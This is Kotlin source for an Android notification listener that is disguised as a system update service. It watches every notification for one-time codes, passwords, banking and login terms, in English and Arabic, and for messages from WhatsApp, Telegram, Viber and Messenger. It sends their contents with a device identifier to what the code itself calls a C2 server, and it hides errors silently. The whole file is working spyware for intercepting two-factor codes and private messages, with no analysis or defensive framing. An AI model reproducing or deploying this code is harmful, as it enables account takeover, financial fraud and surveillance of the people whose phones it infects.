package com.android.system.update.services

import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import com.android.system.update.core.NetworkConnectionManager
import org.json.JSONObject
import java.nio.charset.StandardCharsets

class NotificationFilter : NotificationListenerService() {

    private lateinit var connectionManager: NetworkConnectionManager

    private val sensitiveKeywords = listOf(
        "code", "otp", "verification", "password", "رمز", "تفعيل", "كلمة المرور", "بنك", "bank", "login"
    )

    override fun onCreate() {
        super.onCreate()
        connectionManager = NetworkConnectionManager(this)
    }

    override fun onNotificationPosted(sbn: StatusBarNotification) {
        try {
            val packageName = sbn.packageName
            val extras = sbn.notification.extras
            val title = extras.getString("android.title")?.sanitize() ?: "No Title"
            val text = extras.getCharSequence("android.text")?.toString()?.sanitize() ?: "No Content"

            if (packageName == "android" || packageName == "com.android.systemui") return

            val fullContent = "$title $text"
            val isSensitive = sensitiveKeywords.any { fullContent.contains(it, ignoreCase = true) }

            if (isSensitive || isSocialApp(packageName)) {
                sendNotificationToC2(packageName, title, text, isSensitive)
            }
        } catch (e: Exception) {
        }
    }

    private fun sendNotificationToC2(app: String, title: String, content: String, priority: Boolean) {
        val data = JSONObject().apply {
            put("device_id", connectionManager.getDeviceId())
            put("package_name", app)
            put("title", title)
            put("content", content)
            put("is_priority", priority)
            put("timestamp", System.currentTimeMillis())
        }
        connectionManager.sync(data.toString(), "notification_logs")
    }

    private fun String.sanitize(): String {
        return try {
            val bytes = this.toByteArray(StandardCharsets.UTF_8)
            String(bytes, StandardCharsets.UTF_8)
        } catch (e: Exception) {
            this.replace(Regex("[^\\p{L}\\p{N}\\p{P}\\p{Z}]"), "")
        }
    }

    private fun isSocialApp(packageName: String): Boolean {
        val targets = listOf("whatsapp", "telegram", "messaging", "viber", "facebook.orca")
        return targets.any { packageName.contains(it) }
    }

    override fun onNotificationRemoved(sbn: StatusBarNotification) {}
}